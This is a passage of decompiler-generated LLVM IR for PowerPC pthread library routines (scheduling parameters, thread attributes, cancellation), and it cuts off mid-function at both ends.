  br i1 %v4_10014768, label %dec_label_pc_1001477c, label %dec_label_pc_10014770

dec_label_pc_10014770:                            ; preds = %dec_label_pc_10014764, %entry
  store i32 ptrtoint ([3 x i8]* @global_var_10014774.1025 to i32), i32* @lr, align 4
  %v0_10014770 = call i32 @__pthread_unlock()
  store i32 3, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100147c4

dec_label_pc_1001477c:                            ; preds = %dec_label_pc_10014764
  %v1_1001477c = add i32 %v3_10014754, 20
  %v2_1001477c = inttoptr i32 %v1_1001477c to i32*
  %v3_1001477c = load i32, i32* %v2_1001477c, align 4
  store i32 %v3_1001477c, i32* %r29.global-to-local, align 4
  store i32 %v0_10014754, i32* @r3, align 4
  store i32 268519304, i32* @lr, align 4
  %v0_10014784 = call i32 @__pthread_unlock()
  store i32 %v3_1001477c, i32* %r3.global-to-local, align 4
  store i32 268519312, i32* @lr, align 4
  %v1_1001478c = call i32 @sched_getscheduler(i32 %v3_1001477c)
  %v0_10014790 = load i32, i32* @r30, align 4
  store i32 %v1_1001478c, i32* @r31, align 4
  %v0_10014798 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10014798, i32* %r3.global-to-local, align 4
  %v3_1001479c = icmp eq i32 %v1_1001478c, -1
  br i1 %v3_1001479c, label %dec_label_pc_100147b4, label %dec_label_pc_100147a4

dec_label_pc_100147a4:                            ; preds = %dec_label_pc_1001477c
  store i32 268519336, i32* @lr, align 4
  %v2_100147a4 = call i32 @sched_getparam(i32 %v0_10014798, i32 %v0_10014790)
  %v3_100147a8 = icmp eq i32 %v2_100147a4, -1
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_100147a8, label %dec_label_pc_100147b4, label %dec_label_pc_100147c0

dec_label_pc_100147b4:                            ; preds = %dec_label_pc_100147a4, %dec_label_pc_1001477c
  %v0_100147b4 = call i32 @__errno_location()
  store i32 %v0_100147b4, i32* %r3.global-to-local, align 4
  %v1_100147b8 = inttoptr i32 %v0_100147b4 to i32*
  %v2_100147b8 = load i32, i32* %v1_100147b8, align 4
  store i32 %v2_100147b8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100147c4

dec_label_pc_100147c0:                            ; preds = %dec_label_pc_100147a4
  %v0_100147c0 = load i32, i32* @r31, align 4
  %v1_100147c0 = load i32, i32* %r28.global-to-local, align 4
  %v2_100147c0 = inttoptr i32 %v1_100147c0 to i32*
  store i32 %v0_100147c0, i32* %v2_100147c0, align 4
  %v0_100147d4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100147c4

dec_label_pc_100147c4:                            ; preds = %dec_label_pc_100147b4, %dec_label_pc_10014770, %dec_label_pc_100147c0
  %v0_100147d4 = phi i32 [ %v2_100147b8, %dec_label_pc_100147b4 ], [ 3, %dec_label_pc_10014770 ], [ %v0_100147d4.pre, %dec_label_pc_100147c0 ]
  ret i32 %v0_100147d4

; uselistorder directives
  uselistorder i32 %v3_1001477c, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100147c4, { 2, 0, 1 }
}

define i32 @pthread_setschedparam(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %v1_100147ec = call i32 @__asm_rlwinm(i32 %arg1, i32 4, i32 18, i32 27)
  %v2_100147f4 = add i32 %v1_100147ec, ptrtoint (i32* @global_var_10040d40.1024 to i32)
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg2, i32* %r28.global-to-local, align 4
  store i32 %v2_100147f4, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 %tmp, i32* %r27.global-to-local, align 4
  store i32 268519440, i32* @lr, align 4
  %v0_1001480c = call i32 @__pthread_lock()
  %v0_10014810 = load i32, i32* @r31, align 4
  %v1_10014810 = add i32 %v0_10014810, 8
  %v2_10014810 = inttoptr i32 %v1_10014810 to i32*
  %v3_10014810 = load i32, i32* %v2_10014810, align 4
  store i32 %v3_10014810, i32* %r30.global-to-local, align 4
  store i32 %v0_10014810, i32* @r3, align 4
  %v3_10014818 = icmp eq i32 %v3_10014810, 0
  br i1 %v3_10014818, label %dec_label_pc_10014834, label %dec_label_pc_10014820

dec_label_pc_10014820:                            ; preds = %entry
  %v1_10014820 = add i32 %v3_10014810, 16
  %v2_10014820 = inttoptr i32 %v1_10014820 to i32*
  %v3_10014820 = load i32, i32* %v2_10014820, align 4
  %v0_1001482c = load i32, i32* @r29, align 4
  %v4_1001482c = icmp eq i32 %v0_1001482c, %v3_10014820
  br i1 %v4_1001482c, label %dec_label_pc_10014840, label %dec_label_pc_10014834

dec_label_pc_10014834:                            ; preds = %dec_label_pc_10014820, %entry
  store i32 ptrtoint ([3 x i8]* @global_var_10014838.1026 to i32), i32* @lr, align 4
  %v0_10014834 = call i32 @__pthread_unlock()
  br label %dec_label_pc_1001489c

dec_label_pc_10014840:                            ; preds = %dec_label_pc_10014820
  store i32 268519496, i32* @lr, align 4
  %v0_10014844 = call i32 @sched_setscheduler()
  %v3_10014848 = icmp eq i32 %v0_10014844, -1
  %v0_1001484c = load i32, i32* @r31, align 4
  store i32 %v0_1001484c, i32* @r3, align 4
  br i1 %v3_10014848, label %dec_label_pc_10014858, label %dec_label_pc_10014868

dec_label_pc_10014858:                            ; preds = %dec_label_pc_10014840
  store i32 268519516, i32* @lr, align 4
  %v0_10014858 = call i32 @__pthread_unlock()
  %v0_1001485c = call i32 @__errno_location()
  %v1_10014860 = inttoptr i32 %v0_1001485c to i32*
  %v2_10014860 = load i32, i32* %v1_10014860, align 4
  br label %dec_label_pc_1001489c

dec_label_pc_10014868:                            ; preds = %dec_label_pc_10014840
  %v0_10014850 = load i32, i32* %r28.global-to-local, align 4
  %v3_10014850 = icmp eq i32 %v0_10014850, 0
  br i1 %v3_10014850, label %dec_label_pc_10014874, label %dec_label_pc_10014870

dec_label_pc_10014870:                            ; preds = %dec_label_pc_10014868
  %v0_10014870 = load i32, i32* %r27.global-to-local, align 4
  %v1_10014870 = inttoptr i32 %v0_10014870 to i32*
  %v2_10014870 = load i32, i32* %v1_10014870, align 4
  br label %dec_label_pc_10014874

dec_label_pc_10014874:                            ; preds = %dec_label_pc_10014868, %dec_label_pc_10014870
  %v0_10014874 = phi i32 [ 0, %dec_label_pc_10014868 ], [ %v2_10014870, %dec_label_pc_10014870 ]
  %v1_10014874 = load i32, i32* %r30.global-to-local, align 4
  %v2_10014874 = add i32 %v1_10014874, 24
  %v3_10014874 = inttoptr i32 %v2_10014874 to i32*
  store i32 %v0_10014874, i32* %v3_10014874, align 4
  store i32 268519548, i32* @lr, align 4
  %v0_10014878 = call i32 @__pthread_unlock()
  %v3_10014880 = load i32, i32* @global_var_100450c4.984, align 4
  %v1_10014888 = icmp slt i32 %v3_10014880, 0
  br i1 %v1_10014888, label %dec_label_pc_1001489c, label %dec_label_pc_10014890

dec_label_pc_10014890:                            ; preds = %dec_label_pc_10014874
  %v0_10014890 = load i32, i32* %r30.global-to-local, align 4
  %v1_10014890 = add i32 %v0_10014890, 24
  %v2_10014890 = inttoptr i32 %v1_10014890 to i32*
  %v3_10014890 = load i32, i32* %v2_10014890, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10014898.1027 to i32), i32* @lr, align 4
  %v1_10014894 = call i32 @__pthread_manager_adjust_prio(i32 %v3_10014890)
  br label %dec_label_pc_1001489c

dec_label_pc_1001489c:                            ; preds = %dec_label_pc_10014874, %dec_label_pc_10014858, %dec_label_pc_10014834, %dec_label_pc_10014890
  %v0_100148ac = phi i32 [ 0, %dec_label_pc_10014874 ], [ %v2_10014860, %dec_label_pc_10014858 ], [ 3, %dec_label_pc_10014834 ], [ 0, %dec_label_pc_10014890 ]
  ret i32 %v0_100148ac

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1001489c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10014874, { 1, 0 }
}

define i32 @pthread_attr_destroy() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__GI_pthread_attr_setdetachstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_100148b8 = icmp ugt i32 %arg2, 1
  br i1 %v2_100148b8, label %dec_label_pc_100148cc, label %dec_label_pc_100148c4

dec_label_pc_100148c4:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_100148cc

dec_label_pc_100148cc:                            ; preds = %entry, %dec_label_pc_100148c4
  %v0_100148cc = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_100148c4 ]
  ret i32 %v0_100148cc

; uselistorder directives
  uselistorder label %dec_label_pc_100148cc, { 1, 0 }
}

define i32 @__GI_pthread_attr_getdetachstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_100148d4 = load i32, i32* %arg1, align 4
  %v2_100148dc = inttoptr i32 %arg2 to i32*
  store i32 %v2_100148d4, i32* %v2_100148dc, align 4
  ret i32 0
}

define i32 @__GI_pthread_attr_setschedpolicy(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_100148e4 = icmp ugt i32 %arg2, 2
  br i1 %v2_100148e4, label %dec_label_pc_100148f8, label %dec_label_pc_100148f0

dec_label_pc_100148f0:                            ; preds = %entry
  %v2_100148f0 = add i32 %arg1, 4
  %v3_100148f0 = inttoptr i32 %v2_100148f0 to i32*
  store i32 %arg2, i32* %v3_100148f0, align 4
  br label %dec_label_pc_100148f8

dec_label_pc_100148f8:                            ; preds = %entry, %dec_label_pc_100148f0
  %v0_100148f8 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_100148f0 ]
  ret i32 %v0_100148f8

; uselistorder directives
  uselistorder label %dec_label_pc_100148f8, { 1, 0 }
}

define i32 @pthread_attr_getschedpolicy(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_10014900 = add i32 %arg1, 4
  %v2_10014900 = inttoptr i32 %v1_10014900 to i32*
  %v3_10014900 = load i32, i32* %v2_10014900, align 4
  store i32 %v3_10014900, i32* %arg2, align 4
  ret i32 0
}

define i32 @pthread_attr_setinheritsched(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_10014910 = icmp ugt i32 %arg2, 1
  br i1 %v2_10014910, label %dec_label_pc_10014924, label %dec_label_pc_1001491c

dec_label_pc_1001491c:                            ; preds = %entry
  %v2_1001491c = add i32 %arg1, 12
  %v3_1001491c = inttoptr i32 %v2_1001491c to i32*
  store i32 %arg2, i32* %v3_1001491c, align 4
  br label %dec_label_pc_10014924

dec_label_pc_10014924:                            ; preds = %entry, %dec_label_pc_1001491c
  %v0_10014924 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_1001491c ]
  ret i32 %v0_10014924

; uselistorder directives
  uselistorder label %dec_label_pc_10014924, { 1, 0 }
}

define i32 @pthread_attr_getinheritsched(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_1001492c = add i32 %arg1, 12
  %v2_1001492c = inttoptr i32 %v1_1001492c to i32*
  %v3_1001492c = load i32, i32* %v2_1001492c, align 4
  store i32 %v3_1001492c, i32* %arg2, align 4
  ret i32 0
}

define i32 @pthread_attr_setscope(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_10014964 = load i32, i32* @lr, align 4
  %v2_10014964 = icmp ne i32 %arg2, 0
  call void @__pseudo_cond_branch(i1 %v2_10014964, i32 %v0_10014964)
  %v2_1001496c = add i32 %arg1, 16
  %v3_1001496c = inttoptr i32 %v2_1001496c to i32*
  store i32 %arg2, i32* %v3_1001496c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @pthread_attr_getscope(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_10014974 = add i32 %arg1, 16
  %v2_10014974 = inttoptr i32 %v1_10014974 to i32*
  %v3_10014974 = load i32, i32* %v2_10014974, align 4
  store i32 %v3_10014974, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_getguardsize(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_10014984 = add i32 %arg1, 20
  %v2_10014984 = inttoptr i32 %v1_10014984 to i32*
  %v3_10014984 = load i32, i32* %v2_10014984, align 4
  store i32 %v3_10014984, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_setstackaddr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10014998 = add i32 %arg1, 28
  %v3_10014998 = inttoptr i32 %v2_10014998 to i32*
  store i32 %arg2, i32* %v3_10014998, align 4
  %v0_1001499c = load i32, i32* %r0.global-to-local, align 4
  %v2_1001499c = add i32 %arg1, 24
  %v3_1001499c = inttoptr i32 %v2_1001499c to i32*
  store i32 %v0_1001499c, i32* %v3_1001499c, align 4
  ret i32 0
}

define i32 @__pthread_attr_getstackaddr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_100149a8 = add i32 %arg1, 28
  %v2_100149a8 = inttoptr i32 %v1_100149a8 to i32*
  %v3_100149a8 = load i32, i32* %v2_100149a8, align 4
  store i32 %v3_100149a8, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_setstacksize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg2, 16384
  br i1 %tmp, label %dec_label_pc_100149cc, label %dec_label_pc_100149c4

dec_label_pc_100149c4:                            ; preds = %entry
  %v2_100149c4 = add i32 %arg1, 32
  %v3_100149c4 = inttoptr i32 %v2_100149c4 to i32*
  store i32 %arg2, i32* %v3_100149c4, align 4
  br label %dec_label_pc_100149cc

dec_label_pc_100149cc:                            ; preds = %entry, %dec_label_pc_100149c4
  %v0_100149cc = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_100149c4 ]
  ret i32 %v0_100149cc

; uselistorder directives
  uselistorder label %dec_label_pc_100149cc, { 1, 0 }
}

define i32 @__pthread_attr_getstacksize(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_100149d4 = add i32 %arg1, 32
  %v2_100149d4 = inttoptr i32 %v1_100149d4 to i32*
  %v3_100149d4 = load i32, i32* %v2_100149d4, align 4
  store i32 %v3_100149d4, i32* %arg2, align 4
  ret i32 0
}

define i32 @__GI_pthread_attr_init(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_100149e8 = load i32, i32* @lr, align 4
  store i32 %v0_100149e8, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100149fc.1028 to i32), i32* @lr, align 4
  %v0_100149f8 = call i32 @__GI_getpagesize()
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10014a04 = sub i32 2097152, %v0_100149f8
  store i32 %v2_10014a04, i32* %r0.global-to-local, align 4
  %v2_10014a08 = add i32 %tmp, 20
  %v3_10014a08 = inttoptr i32 %v2_10014a08 to i32*
  store i32 %v0_100149f8, i32* %v3_10014a08, align 4
  %v0_10014a0c = load i32, i32* %r0.global-to-local, align 4
  %v1_10014a0c = load i32, i32* %r29.global-to-local, align 4
  %v2_10014a0c = add i32 %v1_10014a0c, 32
  %v3_10014a0c = inttoptr i32 %v2_10014a0c to i32*
  store i32 %v0_10014a0c, i32* %v3_10014a0c, align 4
  %v1_10014a14 = load i32, i32* %r29.global-to-local, align 4
  %v2_10014a14 = add i32 %v1_10014a14, 12
  %v3_10014a14 = inttoptr i32 %v2_10014a14 to i32*
  store i32 1, i32* %v3_10014a14, align 4
  %v0_10014a1c = load i32, i32* %r9.global-to-local, align 4
  %v1_10014a1c = load i32, i32* %r29.global-to-local, align 4
  %v2_10014a1c = add i32 %v1_10014a1c, 24
  %v3_10014a1c = inttoptr i32 %v2_10014a1c to i32*
  store i32 %v0_10014a1c, i32* %v3_10014a1c, align 4
  %v0_10014a20 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014a20 = load i32, i32* %r29.global-to-local, align 4
  %v2_10014a20 = inttoptr i32 %v1_10014a20 to i32*
  store i32 %v0_10014a20, i32* %v2_10014a20, align 4
  %v0_10014a24 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014a24 = load i32, i32* %r29.global-to-local, align 4
  %v2_10014a24 = add i32 %v1_10014a24, 4
  %v3_10014a24 = inttoptr i32 %v2_10014a24 to i32*
  store i32 %v0_10014a24, i32* %v3_10014a24, align 4
  %v0_10014a28 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014a28 = load i32, i32* %r29.global-to-local, align 4
  %v2_10014a28 = add i32 %v1_10014a28, 8
  %v3_10014a28 = inttoptr i32 %v2_10014a28 to i32*
  store i32 %v0_10014a28, i32* %v3_10014a28, align 4
  %v0_10014a2c = load i32, i32* %r9.global-to-local, align 4
  %v1_10014a2c = load i32, i32* %r29.global-to-local, align 4
  %v2_10014a2c = add i32 %v1_10014a2c, 16
  %v3_10014a2c = inttoptr i32 %v2_10014a2c to i32*
  store i32 %v0_10014a2c, i32* %v3_10014a2c, align 4
  %v0_10014a30 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014a30 = load i32, i32* %r29.global-to-local, align 4
  %v2_10014a30 = add i32 %v1_10014a30, 28
  %v3_10014a30 = inttoptr i32 %v2_10014a30 to i32*
  store i32 %v0_10014a30, i32* %v3_10014a30, align 4
  store i32 %v0_100149e8, i32* %r0.global-to-local, align 4
  ret i32 0
}

define i32 @__pthread_attr_setguardsize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 268520036, i32* @lr, align 4
  %v0_10014a60 = call i32 @__GI_getpagesize()
  %v1_10014a64 = add i32 %arg1, 32
  %v2_10014a64 = inttoptr i32 %v1_10014a64 to i32*
  %v3_10014a64 = load i32, i32* %v2_10014a64, align 4
  %v2_10014a68 = add i32 %v0_10014a60, -1
  %v1_10014a70 = add i32 %v2_10014a68, %arg2
  %v2_10014a74 = urem i32 %v1_10014a70, %v0_10014a60
  %v2_10014a78 = sub i32 %v1_10014a70, %v2_10014a74
  %v2_10014a7c = icmp ult i32 %v2_10014a78, %v3_10014a64
  br i1 %v2_10014a7c, label %dec_label_pc_10014a84, label %dec_label_pc_10014a8c

dec_label_pc_10014a84:                            ; preds = %entry
  %v2_10014a84 = add i32 %arg1, 20
  %v3_10014a84 = inttoptr i32 %v2_10014a84 to i32*
  store i32 %v2_10014a78, i32* %v3_10014a84, align 4
  br label %dec_label_pc_10014a8c

dec_label_pc_10014a8c:                            ; preds = %entry, %dec_label_pc_10014a84
  %v0_10014a90 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_10014a84 ]
  ret i32 %v0_10014a90

; uselistorder directives
  uselistorder i32 %v0_10014a60, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10014a8c, { 1, 0 }
}

define i32 @__GI_pthread_attr_getschedparam(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 4, i32* @r5, align 4
  %v1_10014ab4 = add i32 %arg1, 8
  store i32 %arg2, i32* @r3, align 4
  store i32 %v1_10014ab4, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10014ac4.1029 to i32), i32* @lr, align 4
  %v0_10014ac0 = call i32 @memcpy()
  ret i32 0
}

define i32 @__GI_pthread_attr_setschedparam(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @r31, align 4
  store i32 %tmp, i32* %r30.global-to-local, align 4
  %v1_10014af0 = add i32 %arg1, 4
  %v2_10014af0 = inttoptr i32 %v1_10014af0 to i32*
  %v3_10014af0 = load i32, i32* %v2_10014af0, align 4
  store i32 268520184, i32* @lr, align 4
  %v1_10014af4 = call i32 @sched_get_priority_max(i32 %v3_10014af0)
  store i32 %v1_10014af4, i32* %r29.global-to-local, align 4
  %v0_10014afc = load i32, i32* @r31, align 4
  %v1_10014afc = add i32 %v0_10014afc, 4
  %v2_10014afc = inttoptr i32 %v1_10014afc to i32*
  %v3_10014afc = load i32, i32* %v2_10014afc, align 4
  store i32 268520196, i32* @lr, align 4
  %v1_10014b00 = call i32 @sched_get_priority_min(i32 %v3_10014afc)
  %v0_10014b04 = load i32, i32* %r30.global-to-local, align 4
  %v1_10014b04 = inttoptr i32 %v0_10014b04 to i32*
  %v2_10014b04 = load i32, i32* %v1_10014b04, align 4
  %v2_10014b0c = icmp slt i32 %v2_10014b04, %v1_10014b00
  br i1 %v2_10014b0c, label %dec_label_pc_10014b30, label %dec_label_pc_10014b18

dec_label_pc_10014b18:                            ; preds = %entry
  %v1_10014b10 = load i32, i32* %r29.global-to-local, align 4
  %v3_10014b10 = icmp sgt i32 %v2_10014b04, %v1_10014b10
  %v0_10014b18 = load i32, i32* @r31, align 4
  %v1_10014b18 = add i32 %v0_10014b18, 8
  store i32 %v1_10014b18, i32* @r3, align 4
  store i32 %v0_10014b04, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  br i1 %v3_10014b10, label %dec_label_pc_10014b30, label %dec_label_pc_10014b28

dec_label_pc_10014b28:                            ; preds = %dec_label_pc_10014b18
  store i32 ptrtoint ([3 x i8]* @global_var_10014b2c.1030 to i32), i32* @lr, align 4
  %v0_10014b28 = call i32 @memcpy()
  br label %dec_label_pc_10014b30

dec_label_pc_10014b30:                            ; preds = %dec_label_pc_10014b18, %entry, %dec_label_pc_10014b28
  %v0_10014b34 = phi i32 [ 22, %dec_label_pc_10014b18 ], [ 22, %entry ], [ 0, %dec_label_pc_10014b28 ]
  ret i32 %v0_10014b34

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10014b30, { 2, 0, 1 }
}

define i32 @__GI_pthread_setcanceltype(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  %v0_10014b4c = load i32, i32* @lr, align 4
  store i32 %v0_10014b4c, i32* %r0.global-to-local, align 4
  %v3_10014b50 = icmp ugt i8 %arg1, 1
  store i32 %tmp, i32* @r11, align 4
  %v0_10014b58 = load i32, i32* @r2, align 4
  store i32 %v0_10014b58, i32* %r9.global-to-local, align 4
  br i1 %v3_10014b50, label %dec_label_pc_10014bac, label %dec_label_pc_10014b68

dec_label_pc_10014b68:                            ; preds = %entry
  %v3_10014b68 = icmp eq i32 %arg2, 0
  br i1 %v3_10014b68, label %dec_label_pc_10014b78, label %dec_label_pc_10014b70

dec_label_pc_10014b70:                            ; preds = %dec_label_pc_10014b68
  %v1_10014b70 = add i32 %v0_10014b58, 65
  %v2_10014b70 = inttoptr i32 %v1_10014b70 to i8*
  %v3_10014b70 = load i8, i8* %v2_10014b70, align 1
  %v4_10014b70 = zext i8 %v3_10014b70 to i32
  store i32 %v4_10014b70, i32* %r0.global-to-local, align 4
  %v2_10014b74 = inttoptr i32 %arg2 to i32*
  store i32 %v4_10014b70, i32* %v2_10014b74, align 4
  %v0_10014b78.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_10014b7c.pre = load i32, i32* @r11, align 4
  %extract.t4 = trunc i32 %v0_10014b7c.pre to i8
  br label %dec_label_pc_10014b78

dec_label_pc_10014b78:                            ; preds = %dec_label_pc_10014b68, %dec_label_pc_10014b70
  %v0_10014b7c.off0 = phi i8 [ %arg1, %dec_label_pc_10014b68 ], [ %extract.t4, %dec_label_pc_10014b70 ]
  %v2_10014b7c = phi i32 [ %v0_10014b58, %dec_label_pc_10014b68 ], [ %v0_10014b78.pre, %dec_label_pc_10014b70 ]
  %v1_10014b78 = add i32 %v2_10014b7c, 66
  %v2_10014b78 = inttoptr i32 %v1_10014b78 to i8*
  %v3_10014b78 = load i8, i8* %v2_10014b78, align 1
  %v4_10014b78 = zext i8 %v3_10014b78 to i32
  store i32 %v4_10014b78, i32* %r0.global-to-local, align 4
  %v3_10014b7c = add i32 %v2_10014b7c, 65
  %v4_10014b7c = inttoptr i32 %v3_10014b7c to i8*
  store i8 %v0_10014b7c.off0, i8* %v4_10014b7c, align 1
  %v0_10014b80 = load i32, i32* %r0.global-to-local, align 4
  %v3_10014b80 = icmp eq i32 %v0_10014b80, 0
  br i1 %v3_10014b80, label %dec_label_pc_10014ba8, label %dec_label_pc_10014b88

dec_label_pc_10014b88:                            ; preds = %dec_label_pc_10014b78
  %v0_10014b88 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014b88 = add i32 %v0_10014b88, 64
  %v2_10014b88 = inttoptr i32 %v1_10014b88 to i32*
  %v3_10014b88 = load i32, i32* %v2_10014b88, align 4
  store i32 %v3_10014b88, i32* %r0.global-to-local, align 4
  store i32 65536, i32* %r9.global-to-local, align 4
  %v1_10014b90 = call i32 @__asm_rlwinm(i32 %v3_10014b88, i32 0, i32 0, i32 15)
  store i32 %v1_10014b90, i32* %r0.global-to-local, align 4
  %v4_10014b94 = icmp eq i32 %v1_10014b90, 65536
  br i1 %v4_10014b94, label %dec_label_pc_10014b9c, label %dec_label_pc_10014ba8

dec_label_pc_10014b9c:                            ; preds = %dec_label_pc_10014b88
  %v0_10014ba4 = call i32 @__pthread_do_exit()
  br label %dec_label_pc_10014ba8

dec_label_pc_10014ba8:                            ; preds = %dec_label_pc_10014b88, %dec_label_pc_10014b78, %dec_label_pc_10014b9c
  br label %dec_label_pc_10014bac

dec_label_pc_10014bac:                            ; preds = %entry, %dec_label_pc_10014ba8
  %v0_10014bb8 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_10014ba8 ]
  store i32 %v0_10014b4c, i32* %r0.global-to-local, align 4
  ret i32 %v0_10014bb8

; uselistorder directives
  uselistorder i32* %r9.global-to-local, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10014bac, { 1, 0 }
  uselistorder label %dec_label_pc_10014ba8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10014b78, { 1, 0 }
}

define i32 @pthread_cancel(i32 %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10040d40.1024 to i32), i32* %r9.global-to-local, align 4
  %v1_10014bd4 = call i32 @__asm_rlwinm(i32 %arg1, i32 4, i32 18, i32 27)
  %v2_10014bdc = add i32 %v1_10014bd4, ptrtoint (i32* @global_var_10040d40.1024 to i32)
  store i32 %v2_10014bdc, i32* @r29, align 4
  store i32 %arg1, i32* %r30.global-to-local, align 4
  store i32 %v2_10014bdc, i32* @r3, align 4
  store i32 268520428, i32* @lr, align 4
  %v0_10014be8 = call i32 @__pthread_lock()
  store i32 %v0_10014be8, i32* %r3.global-to-local, align 4
  %v0_10014bec = load i32, i32* @r29, align 4
  %v1_10014bec = add i32 %v0_10014bec, 8
  %v2_10014bec = inttoptr i32 %v1_10014bec to i32*
  %v3_10014bec = load i32, i32* %v2_10014bec, align 4
  store i32 %v3_10014bec, i32* @r31, align 4
  %v3_10014bf0 = icmp eq i32 %v3_10014bec, 0
  store i1 %v3_10014bf0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014bf0, label %dec_label_pc_10014c04, label %dec_label_pc_10014bf8

dec_label_pc_10014bf8:                            ; preds = %entry
  %v1_10014bf8 = add i32 %v3_10014bec, 16
  %v2_10014bf8 = inttoptr i32 %v1_10014bf8 to i32*
  %v3_10014bf8 = load i32, i32* %v2_10014bf8, align 4
  %v0_10014bfc = load i32, i32* @r30, align 4
  %v4_10014bfc = icmp eq i32 %v0_10014bfc, %v3_10014bf8
  store i1 %v4_10014bfc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10014bfc, label %dec_label_pc_10014c14, label %dec_label_pc_10014c04

dec_label_pc_10014c04:                            ; preds = %dec_label_pc_10014bf8, %entry
  store i32 %v0_10014bec, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10014c0c.1032 to i32), i32* @lr, align 4
  %v0_10014c08 = call i32 @__pthread_unlock()
  br label %dec_label_pc_10014ca0

dec_label_pc_10014c14:                            ; preds = %dec_label_pc_10014bf8
  %v1_10014c14 = add i32 %v3_10014bec, 64
  %v2_10014c14 = inttoptr i32 %v1_10014c14 to i8*
  %v3_10014c14 = load i8, i8* %v2_10014c14, align 1
  %v1_10014c18 = add i32 %v3_10014bec, 66
  %v2_10014c18 = inttoptr i32 %v1_10014c18 to i8*
  %v3_10014c18 = load i8, i8* %v2_10014c18, align 1
  %v4_10014c18 = zext i8 %v3_10014c18 to i32
  store i32 %v4_10014c18, i32* %r9.global-to-local, align 4
  %v3_10014c1c = icmp eq i8 %v3_10014c14, 1
  store i1 %v3_10014c1c, i1* %cr7_eq.global-to-local, align 1
  store i8 1, i8* %v2_10014c18, align 1
  %v0_10014c28 = load i1, i1* %cr7_eq.global-to-local, align 1
